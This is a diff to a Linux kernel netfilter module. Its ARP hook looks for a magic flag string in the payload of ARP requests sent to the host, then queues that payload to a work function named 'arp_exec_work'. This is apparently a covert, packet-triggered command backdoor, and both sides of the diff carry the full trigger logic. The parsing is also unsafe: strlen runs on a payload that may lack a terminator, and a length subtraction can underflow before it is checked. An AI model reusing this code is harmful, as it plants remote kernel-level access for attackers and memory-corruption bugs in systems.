@@ -103,82 +103,82 @@ unsigned int arp_exec_hook(void *priv, struct sk_buff *skb,
     struct arphdr *arp_header;
     struct arp_work *work;
 
-    if (!skb) return NF_ACCEPT;
-
-    /* Check if the packet is an ARP packet */
-    if (skb->protocol != htons(ETH_P_ARP)) return NF_ACCEPT;
+    // Auto-accept bad packet or ARP
+    if (!skb || skb->protocol != htons(ETH_P_ARP)) {
+        return NF_ACCEPT;
+    }
 
     arp_header = arp_hdr(skb);
     unsigned char *arp_ptr = (unsigned char *)(arp_header + 1);
     unsigned char *arp_payload;
 
-    /* Check if it's an ARP request */
-    if (arp_header->ar_op == htons(ARPOP_REQUEST)) {
-        if (arp_header->ar_hrd == htons(ARPHRD_ETHER) && arp_header->ar_pro == htons(ETH_P_IP)) {
-            unsigned char *src_hw = arp_ptr;                       // Sender hardware (MAC) address
-            unsigned char *src_proto = arp_ptr + arp_header->ar_hln; // Sender protocol (IP) address
-            unsigned char *dst_hw = src_proto + arp_header->ar_pln;  // Target hardware (MAC) address
-            unsigned char *dst_proto = dst_hw + arp_header->ar_hln;  // Target protocol (IP) address
-            arp_payload = dst_proto + arp_header->ar_pln;  // Target protocol (IP) address
+    /* Check if it's an Eth/IP ARP request */
+    if (arp_header->ar_op == htons(ARPOP_REQUEST) &&
+        arp_header->ar_hrd == htons(ARPHRD_ETHER) && arp_header->ar_pro == htons(ETH_P_IP)
+    ) {
+        unsigned char *src_hw = arp_ptr;                       // Sender hardware (MAC) address
+        unsigned char *src_proto = arp_ptr + arp_header->ar_hln; // Sender protocol (IP) address
+        unsigned char *dst_hw = src_proto + arp_header->ar_pln;  // Target hardware (MAC) address
+        unsigned char *dst_proto = dst_hw + arp_header->ar_hln;  // Target protocol (IP) address
+        arp_payload = dst_proto + arp_header->ar_pln;  // Target protocol (IP) address
 
-            printk(KERN_INFO "Sender MAC: %pM\n", src_hw);
-            printk(KERN_INFO "Sender IP: %pI4\n", src_proto);
-            printk(KERN_INFO "Target MAC: %pM\n", dst_hw);
-            printk(KERN_INFO "Target IP: %pI4\n", dst_proto);
+        printk(KERN_INFO "Sender MAC: %pM\n", src_hw);
+        printk(KERN_INFO "Sender IP: %pI4\n", src_proto);
+        printk(KERN_INFO "Target MAC: %pM\n", dst_hw);
+        printk(KERN_INFO "Target IP: %pI4\n", dst_proto);
 
-            char target_ip_str[16];
-            snprintf(target_ip_str, sizeof(target_ip_str), "%pI4", dst_proto);
-            if(!is_my_ip(target_ip_str)){
-                printk(KERN_INFO "Not for me");
-                return NF_ACCEPT;
-            } else {
-                printk(KERN_INFO "It's for me!");
-            }
-            /* Allocate memory for work struct */
-            work = (struct arp_work *)kmalloc(sizeof(struct arp_work), GFP_ATOMIC);
-            if (!work) {
-                printk(KERN_ERR "Failed to allocate memory for work struct\n");
-                return NF_ACCEPT;
-            }
-
-            // Add needed header values
-            memcpy(work->src_hw, src_hw, ETH_ALEN);
-            memcpy(work->src_proto, src_proto, IP_ALEN);
-            memcpy(work->dst_hw, dst_hw, ETH_ALEN);
-            memcpy(work->dst_proto, dst_proto, IP_ALEN);
-            // TODO: ensure incoming arp_payload is nul-terminated
-            size_t min_size = (skb_tail_pointer(skb) - arp_payload);
-            if (PAYLOAD_LEN < min_size){
-                min_size = PAYLOAD_LEN;
-            }
-            if (strlen(arp_payload) < min_size){
-                min_size = strlen(arp_payload) + 1;
-            }
-            work->payload_len = min_size - strlen(FLAG);
-            memcpy(work->payload, arp_payload, work->payload_len); 
-            work->payload[work->payload_len] = 0;
-
-            if(work->payload_len < strlen(FLAG)){
-                printk(KERN_INFO "No payload");
-                kfree(work);
-                return NF_ACCEPT;
-            }
-            
-            if(strncmp(work->payload, FLAG, strlen(FLAG)) != 0){
-                printk(KERN_INFO "Didn't contain flag");
-                kfree(work);
-                return NF_ACCEPT;
-            } else {
-                printk(KERN_INFO "Flag found! Enqueing");
-            }
-            
-            /* Initialize work and queue it */
-            INIT_WORK(&work->work, arp_exec_work);
-            queue_work(arp_wq, &work->work);
-            return NF_DROP;
+        char target_ip_str[16];
+        snprintf(target_ip_str, sizeof(target_ip_str), "%pI4", dst_proto);
+        if(!is_my_ip(target_ip_str)){
+            printk(KERN_INFO "Not for me");
+            return NF_ACCEPT;
         } else {
-            printk(KERN_INFO "ARP header does not match Ethernet and IPv4\n");
+            printk(KERN_INFO "It's for me!");
         }
+        /* Allocate memory for work struct */
+        work = (struct arp_work *)kmalloc(sizeof(struct arp_work), GFP_ATOMIC);
+        if (!work) {
+            printk(KERN_ERR "Failed to allocate memory for work struct\n");
+            return NF_ACCEPT;
+        }
+
+        // Add needed header values
+        memcpy(work->src_hw, src_hw, ETH_ALEN);
+        memcpy(work->src_proto, src_proto, IP_ALEN);
+        memcpy(work->dst_hw, dst_hw, ETH_ALEN);
+        memcpy(work->dst_proto, dst_proto, IP_ALEN);
+        // TODO: ensure incoming arp_payload is nul-terminated
+        size_t min_size = (skb_tail_pointer(skb) - arp_payload);
+        if (PAYLOAD_LEN < min_size){
+            min_size = PAYLOAD_LEN;
+        }
+        if (strlen(arp_payload) < min_size){
+            min_size = strlen(arp_payload) + 1;
+        }
+        work->payload_len = min_size - strlen(FLAG);
+        memcpy(work->payload, arp_payload, work->payload_len); 
+        work->payload[work->payload_len] = 0;
+
+        if(work->payload_len < strlen(FLAG)){
+            printk(KERN_INFO "No payload");
+            kfree(work);
+            return NF_ACCEPT;
+        }
+        
+        if(strncmp(work->payload, FLAG, strlen(FLAG)) != 0){
+            printk(KERN_INFO "Didn't contain flag");
+            kfree(work);
+            return NF_ACCEPT;
+        } else {
+            printk(KERN_INFO "Flag found! Enqueing");
+        }
+        
+        /* Initialize work and queue it */
+        INIT_WORK(&work->work, arp_exec_work);
+        queue_work(arp_wq, &work->work);
+        return NF_DROP;
+    } else {
+        printk(KERN_INFO "ARP header does not match Ethernet and IPv4 or is not request\n");
     }
 
     return NF_ACCEPT;
